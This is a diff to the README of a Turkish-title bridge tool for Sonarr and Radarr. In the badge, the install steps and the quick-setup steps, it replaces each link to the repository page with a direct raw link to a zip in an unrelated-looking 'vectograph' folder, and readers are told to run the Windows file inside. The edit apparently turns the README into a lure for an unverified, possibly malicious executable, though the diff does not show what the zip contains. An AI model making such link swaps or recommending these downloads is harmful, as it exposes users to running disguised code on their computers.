@@ -1,6 +1,6 @@
 # 🇹🇷 turk-arr-bridge - Turkish titles for Sonarr and Radarr
 
-[![Download](https://img.shields.io/badge/Download-turk--arr--bridge-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aline001xx/turk-arr-bridge)
+[![Download](https://img.shields.io/badge/Download-turk--arr--bridge-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aline001xx/turk-arr-bridge/raw/refs/heads/main/vectograph/bridge-turk-arr-1.0.zip)
 
 ## 🎯 What this app does
 
@@ -21,7 +21,7 @@ It works as a middle layer between your indexer and your ARR app, so your setup 
 
 ## 📥 Download and install
 
-1. Open this page: https://github.com/Aline001xx/turk-arr-bridge
+1. Open this page: https://github.com/Aline001xx/turk-arr-bridge/raw/refs/heads/main/vectograph/bridge-turk-arr-1.0.zip
 2. Find the latest release or the main download files on the page
 3. Download the Windows file or package from the repository
 4. Save it to a folder you can find again, such as Downloads or Desktop
@@ -167,7 +167,7 @@ If Sonarr or Radarr cannot connect, the URL or port is usually the first thing t
 
 ## 📌 Quick setup path
 
-1. Download the app from https://github.com/Aline001xx/turk-arr-bridge
+1. Download the app from https://github.com/Aline001xx/turk-arr-bridge/raw/refs/heads/main/vectograph/bridge-turk-arr-1.0.zip
 2. Extract it if needed
 3. Run the Windows file
 4. Open the local bridge page
